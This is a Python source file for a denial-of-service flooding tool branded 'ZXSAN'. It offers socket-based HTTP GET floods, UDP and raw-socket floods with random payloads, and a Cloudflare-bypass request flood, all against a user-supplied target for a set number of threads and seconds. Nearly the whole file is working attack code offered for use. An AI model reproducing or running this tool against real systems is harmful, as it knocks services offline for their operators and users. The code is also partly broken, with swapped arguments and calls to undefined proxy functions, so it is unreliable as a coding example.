# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
import getpass
import time
import sys

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.GREEN+" LAUNCH ATTACK => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.BLUE+" IT'S DONE !                                   \n")
            return


##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t
##############################################################################################
#region METHOD
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass
#region GET
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

#region SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass



#endregion

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
##############################################################################################
def title():
    print(""" \033[95m  by ZXSAN
	███████╗██╗░░██╗░██████╗░█████╗░███╗░░██╗
	╚════██║╚██╗██╔╝██╔════╝██╔══██╗████╗░██║
	░░███╔═╝░╚███╔╝░╚█████╗░███████║██╔██╗██║
	██╔══╝░░░██╔██╗░░╚═══██╗██╔══██║██║╚████║
	███████╗██╔╝╚██╗██████╔╝██║░░██║██║░╚███║
	╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══

	METHOD COMMAND 

	-SOC (socket attack) 
	-TCP (tcp attck)
	-UDP (udp attack)
	-CFB (cloudflare bypass attack
\033[0m """)
##############################################################################################
def command():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.GREEN+"[""zxsan"+Fore.RED+"@"+Fore.LIGHTCYAN_EX+"FLOODER"+Fore.CYAN+"]"+Fore.RED+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "exit":
        exit()

        #timer.join()
        time.sleep(1000)
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
##############################################################################################   

def func():
    
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    else:
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")


